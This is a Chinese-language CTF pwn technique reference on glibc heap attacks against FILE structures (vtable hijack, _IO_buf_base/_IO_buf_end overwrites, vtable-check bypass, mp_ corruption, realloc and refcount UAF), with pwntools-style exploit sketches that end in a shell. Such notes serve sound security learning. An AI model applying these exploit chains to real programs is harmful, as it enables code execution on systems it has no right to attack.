# CTF Pwn - 堆 FILE 结构攻击

针对 libc 2.23-2.27+ 的 FILE 结构（_IO_FILE）利用：fastbin→stdout vtable 劫持、`_IO_buf_base` 空字节覆盖、glibc 2.24+ vtable 校验绕过、对 FILE 字段的 unsorted bin 攻击，以及最终落到这些 FILE 原语上的菜单式 UAF / 引用计数缺陷。经典堆攻击（House of *、unlink、tcache、musl）请见 [heap-techniques.md](heap-techniques.md)。

## Table of Contents
- [Fastbin stdout Vtable 两阶段劫持（PIE + Full RELRO，ASIS CTF 2017）](#fastbin-stdout-vtable-两阶段劫持pie--full-relroasis-ctf-2017)
- [_IO_buf_base 空字节覆盖劫持 stdin（Tokyo Westerns 2017）](#_io_buf_base-空字节覆盖劫持-stdintokyo-westerns-2017)
- [glibc 2.24+ _IO_FILE Vtable 校验绕过（HITCON 2017）](#glibc-224-_io_file-vtable-校验绕过hitcon-2017)
- [针对 stdin _IO_buf_end 的 Unsorted Bin 攻击（HITCON 2017）](#针对-stdin-_io_buf_end-的-unsorted-bin-攻击hitcon-2017)
- [通过 mp_ 结构破坏 Unsorted Bin（HITCON 2017）](#通过-mp_-结构破坏-unsorted-binhitcon-2017)
- [用 realloc(ptr, 0) 当作 free() 制造 UAF（AceBear 2018）](#用-reallocptr-0-当作-free-制造-uafacebear-2018)
- [单字节引用计数回绕导致 UAF（WhiteHat Grand Prix 2018）](#单字节引用计数回绕导致-uafwhitehat-grand-prix-2018)

---

<a id="fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017"></a>
## Fastbin stdout Vtable 两阶段劫持（PIE + Full RELRO，ASIS CTF 2017）

**模式：** 当 PIE 与 Full RELRO 阻断了 GOT 覆盖时，转而用 fastbin 攻击 libc 的 stdout FILE 结构，并采用两阶段 vtable 劫持。

```python
from pwn import *

# Stage 1: Fastbin double-free targeting fake chunk inside stdout
# Use 0x7f byte in libc stdout region as fake chunk size (matches 0x70 fastbin)
fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte

# Double-free in 0x70 fastbin
alloc_a = malloc(0x60)
alloc_b = malloc(0x60)
free(alloc_a)
free(alloc_b)
free(alloc_a)  # double-free: fastbin 0x70 = [a -> b -> a]

# Redirect fastbin to stdout region
malloc(0x60, p64(fake_chunk_addr))  # a's fd -> fake chunk in stdout
malloc(0x60)                         # returns b
malloc(0x60)                         # returns a again

# Stage 2a: First vtable overwrite → gets()
# rdi points to stdout struct, so gets(stdout) reads input into stdout
fake_stdout_chunk = malloc(0x60)     # returns fake chunk overlapping stdout
write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets

# Stage 2b: gets() overwrites stdout vtable again → system()
# Next puts() call triggers: vtable lookup → gets(stdout)
# gets() reads from stdin into the stdout struct, overwriting vtable again
# Input: "1\x80;/bin/sh;" — new vtable points to system()
# After gets() returns, next output call triggers system()
```

**关键洞察：** libc 的 stdout 区域内天然存在一个 `0x7f` 字节，恰好满足 0x70 fastbin 的大小校验。两阶段劫持：先把 vtable 指向 `gets()`（因为 rdi 就是 stdout FILE*），随后 `gets()` 再从 stdin 读入第二份 vtable（指向 `system()`）以及命令字符串。该技术即使面对 PIE + Full RELRO 也有效，因为它打的是 libc 可写数据段，而不是 GOT。

**识别时机：** 题目同时具备 PIE + Full RELRO，且存在堆 UAF 或 double-free。libc FILE 结构里的 `0x7f` 字节是通用的 fastbin 靶点。在 `_IO_2_1_stdout_` 区域按对齐偏移寻找可作为假 chunk 大小的 `0x7f` 字节。

**参考：** ASIS CTF 2017

---

<a id="_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017"></a>
## _IO_buf_base 空字节覆盖劫持 stdin（Tokyo Westerns 2017）

**模式：** 一个空字节（off-by-one）堆溢出破坏 stdin `_IO_FILE` 结构中 `_IO_buf_base` 的最低有效字节。这把 stdin 的输入缓冲区指针重定向到 `_short_buf` —— 位于 FILE 结构内部的一小块内部缓冲区。随后的 `scanf`/`fgets` 调用就会把攻击者输入直接写入 FILE 结构，从而可把 `_IO_buf_base`/`_IO_buf_end` 覆写为任意地址，获得完整写原语。

**原理：**
```c
// Null byte overwrite targets _IO_buf_base's LSB
// Before: _IO_buf_base = 0x7f...XX00  (points to heap input buffer)
// After:  _IO_buf_base = 0x7f...0000  (points into FILE struct itself,
//                                       landing near _short_buf)
// Next scanf() / fgets() reads input into the FILE struct
// Overwrite _IO_buf_base/_IO_buf_end fields with arbitrary addresses
// Now stdin reads from attacker-controlled memory address
```

**利用链：**
```python
# 1. Arrange heap: allocation immediately before stdin's _IO_buf_base
#    (requires heap grooming so chunk is adjacent to FILE struct)

# 2. Null-byte overflow: write one 0x00 byte past chunk boundary
#    → corrupts _IO_buf_base LSB → points into FILE struct

# 3. Next read (scanf/fgets): input written into FILE struct fields
#    → overwrite _IO_buf_base = target_addr, _IO_buf_end = target_addr + size

# 4. Next read: stdin reads from target_addr → arbitrary write primitive
#    → overwrite __free_hook with system() or one_gadget

# 5. Trigger: call a function that invokes free() with a controlled pointer
#    → system("/bin/sh")
```

**关键洞察：** 向 stdin 的 `_IO_buf_base` 打空字节溢出，会把输入缓冲区搬进 FILE 结构自身，进而通过标准 I/O 函数获得任意写。最低字节被清零时，FILE 结构里的 `_short_buf` 字段就是天然的落点。

**参考：** Tokyo Westerns CTF 2017

---

<a id="glibc-224-_io_file-vtable-validation-bypass-hitcon-2017"></a>
## glibc 2.24+ _IO_FILE Vtable 校验绕过（HITCON 2017）

**模式：** glibc 2.24+ 会校验 vtable 指针是否位于 `_IO_vtables` 段内，落在该范围之外的指针会被拒绝。绕过方式：利用两次间接解引用到达未被检查的子函数入口。在堆上安排相距 0x10 字节的两个指针（借助 unsorted bin 的 fd/bk）。第一个指针设为 `valid_vtable_addr - 0x18`，第二个设为 `system()`。`_IO_flush_all_lockp` 会解引用 `*(addr + 0xd8) + 0x18`，落到一个未受校验的子函数上，该子函数再调用 `*(addr + 0xe8)`。

**两跳绕过原理：**
```c
// _IO_flush_all_lockp calls:
//   fp->vtable->_IO_overflow(fp)
// With a valid vtable addr but offset trick:
//   vtable[offset] → points to sub-function outside vtable validation
//   sub-function dereferences further → calls system()

// Heap layout using unsorted bin fd/bk (0x10 apart):
//   [heap + 0x00]: valid_vtable_addr - 0x18   (passes vtable check at offset 0xd8)
//   [heap + 0x10]: system()                   (called via *(addr + 0xe8) dereference)
```

**准备：**
```python
# Place two pointers 0x10 apart using unsorted bin fd/bk as write targets
# unsorted bin attack: write main_arena+88 to target, leak heap/libc
# Craft FILE struct with _flags = " sh\x00" for system() argument
# Trigger exit() → _IO_flush_all_lockp → two-hop call → system("sh")
```

**关键洞察：** vtable 校验只检查地址范围，不检查通过子函数可达的间接入口 —— 两跳调用链因此绕过 `__IO_vtable_check`。unsorted bin 中 chunk 的 fd/bk 指针恰好相距 0x10 字节，正好构成所需的两个相邻指针槽。

**参考：** HITCON CTF 2017

---

<a id="unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017"></a>
## 针对 stdin _IO_buf_end 的 Unsorted Bin 攻击（HITCON 2017）

**模式：** 一个 off-by-one 空字节造成堆 chunk 重叠。将其释放进 unsorted bin，再用 unsorted bin 攻击（破坏 unsorted bin chunk 的 `bk`）把 stdin FILE 结构的 `_IO_buf_end` 覆写成一个很大的 libc 地址（main_arena+88）。下一次 `scanf` 就会把攻击者数据读入 libc 的 stdin 缓冲区区域 —— 从而可把 `__malloc_hook` 覆盖为 one_gadget。

**利用链：**
```python
# 1. Off-by-one NULL: corrupt next chunk's PREV_INUSE, set prev_size
#    → create overlapping chunks via heap consolidation

# 2. Free victim into unsorted bin
#    → victim->fd = main_arena+88, victim->bk = main_arena+96

# 3. Unsorted bin attack: set victim->bk = &stdin._IO_buf_end - 0x10
#    When malloc() removes victim from unsorted bin:
#    → victim->bk->fd = victim   (writes heap address → _IO_buf_end)
#    But for full attack: set bk = &target - 0x10 to write main_arena+88 there

# 4. stdin._IO_buf_end is now a large value → next scanf reads huge input
#    → attacker data written into libc stdin buffer region
#    → __malloc_hook in that region gets overwritten with one_gadget

# 5. Trigger: any malloc() call → __malloc_hook → one_gadget → shell
```

**关键洞察：** 对 `_IO_buf_end` 的 unsorted bin 攻击会让 `scanf` 从 libc 数据段内攻击者可控的缓冲区读取。由于 `__malloc_hook` 在 libc 中就位于 stdin 缓冲区附近，一次大读取就能把它覆盖成 one_gadget 地址。

**参考：** HITCON CTF 2017

---

<a id="unsorted-bin-corruption-via-mp_-structure-hitcon-2017"></a>
## 通过 mp_ 结构破坏 Unsorted Bin（HITCON 2017）

**模式：** glibc 的 `mp_`（`malloc_par`）全局结构在 libc 数据段中紧邻 unsorted bin。堆溢出叠加 unsorted bin 破坏，可把 `mp_->bk` 覆写为 `mp_` 内部的某个地址。`mp_` 结构中的某些字段在被当作空闲 chunk 头解释时，能通过 unsorted bin 校验（`size < system_mem`）。从这块"chunk"分配即可获得 `mp_` 内部的写权限，从而覆盖 `__malloc_hook`。需要部分暴力破解 ASLR（成功率 1/16）以满足堆地址对齐。

**mp_ 为何可用：**
```c
// mp_ layout (glibc 2.23, near unsorted bin in libc BSS):
// struct malloc_par {
//   unsigned long  trim_threshold;   // offset 0x00 — large value, passes size check
//   unsigned long  top_pad;          // offset 0x08
//   ...
//   unsigned long  system_mem;       // offset 0x48 — must be > fake chunk size
// };
// mp_.trim_threshold interpreted as chunk size → satisfies unsorted bin checks
// malloc from mp_-as-chunk returns memory overlapping mp_ fields
// Write __malloc_hook offset within mp_ → control next malloc → one_gadget
```

**利用：**
```python
# Heap overflow: corrupt unsorted bin chunk's bk to point into mp_
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # offset where size field looks valid

# Trigger unsorted bin traversal: malloc() of appropriate size
# → unsorted bin unlinks fake chunk at mp_
# → returns pointer into mp_ data
# Write one_gadget to __malloc_hook offset within returned chunk
malloc(size)  # returns mp_+0x10
write_to_result(one_gadget)  # overwrites __malloc_hook

# Trigger: next malloc() → __malloc_hook → one_gadget → shell
```

**关键洞察：** glibc 的 `mp_` 全局结构天然能通过 unsorted bin 校验 —— 它的 `trim_threshold` 字段就是一个极具说服力的假 chunk 大小。通过 unsorted bin 破坏在其中植入假空闲 chunk，即可直接分配进 glibc 元数据，完全不需要在堆侧构造假 chunk。

**参考：** HITCON CTF 2017

---

<a id="reallocptr-0-as-free-for-uaf-acebear-2018"></a>
## 用 realloc(ptr, 0) 当作 free() 制造 UAF（AceBear 2018）

**模式：** 在许多 glibc 版本中，`realloc(ptr, 0)` 的行为等同于 `free(ptr)`：chunk 被归还到 freelist，而应用可能仍保留旧指针 —— 从而产生 use-after-free。

**原理：**
```c
// C standard says realloc(ptr, 0) is implementation-defined
// In glibc: realloc(ptr, 0) calls free(ptr) and returns NULL
// If the application doesn't check the return value:
void *ptr = malloc(0x80);
ptr = realloc(ptr, 0);    // ptr is now NULL, chunk is freed
// But if the app stores the old pointer separately:
void *saved = ptr;
ptr = realloc(ptr, 0);    // freed, but saved still points to freed chunk
// saved is now a dangling pointer → UAF
```

**利用：**
```python
from pwn import *

# Step 1: Allocate a chunk
add(0, 0x80, b"AAAA")  # chunk at index 0

# Step 2: Trigger realloc with size 0
# Internally calls realloc(ptr, 0) which frees the chunk
edit(0, size=0)  # realloc(ptr, 0) = free(ptr)
# ptr is now freed but the application still holds the pointer at index 0

# Step 3: Allocate new chunk that reuses the freed memory
add(1, 0x80, b"BBBB")  # gets the same address as freed chunk

# Step 4: Read through original index 0 → reads attacker-controlled data from index 1
# Or: write through index 0 to corrupt index 1's chunk
view(0)  # UAF read — sees "BBBB" written by index 1
```

**Tcache 变体（glibc 2.26+）：**
```python
# realloc(ptr, 0) puts the chunk in the tcache bin
# Subsequent malloc of the same size returns the same chunk
# Double reference enables tcache poisoning:

add(0, 0x80, b"AAAA")
edit(0, size=0)           # free via realloc → tcache[0x90]
add(1, 0x80, p64(target)) # reuse freed chunk, write fake fd pointer
# If index 0 still references the chunk:
edit(0, size=0)           # double-free via realloc → tcache poisoning
add(2, 0x80, b"CCCC")    # returns freed chunk
add(3, 0x80, payload)    # returns target address → arbitrary write
```

**关键洞察：** `realloc(ptr, 0)` 的行为由实现定义。在 glibc 中它释放内存块并返回 NULL。如果应用不检查返回值、或仍然使用旧指针，就会产生 UAF。留意那些 size 参数由用户控制的 `realloc` 调用 —— 把它设为 0 即可绕过应用正常的删除/free 路径触发释放，可能同时绕过删除处理器里的引用计数或指针置空逻辑。

**识别时机：** 题目使用 `realloc` 做扩容，且大小由用户控制。"edit" 或 "resize" 功能内部调用 `realloc` —— 检查 size=0 是被特殊处理还是直接透传。同时检查 `realloc` 的返回值是否被用于更新存储的指针（如果没更新，旧指针就成了悬空指针）。

**参考：** AceBear 2018

---

<a id="single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018"></a>
## 单字节引用计数回绕导致 UAF（WhiteHat Grand Prix 2018）

**模式：** 某个结构体用 `uint8_t` 字段保存自身引用计数。只有当 `refcount == 0` 时对象才会被释放，但由于计数在 256 处回绕，调用 `addref()` 路径 256 次就能让 `refcount` 回到零，而此时所有未释放的句柄仍持有有效指针。下一次调用 `release()` 会释放对象 —— 其余所有句柄全部变成悬空指针。

**利用示意：**
```c
struct Book {
    uint8_t refcount;     // 1 byte — vulnerable
    char title[32];
    void (*read)(struct Book*);
};

// 1. create(h0)                    refcount = 1
// 2. dup(h0) → h1 ... h256         refcount wraps 1 → 2 → ... → 0
// 3. release(h1)                   refcount = 255 (underflow) → object freed
// 4. Heap reallocation fills the same chunk with attacker data
// 5. read(h0)                      calls attacker-controlled vtable pointer
```

**关键洞察：** 任何用于守卫对象生命周期的计数器，宽度都必须足以超过程序在单次会话内能创建的句柄数量。`uint8_t` 引用计数永远是危险信号 —— 检查 `addref` 路径是饱和处理（停在 255）还是使用了更宽的类型。该利用只需要 256 次 `addref` 加一次额外的 `release`，因此即便句柄 API 有严格频率限制也依然可达。

**参考：** WhiteHat Grand Prix 2018 — writeup 10809
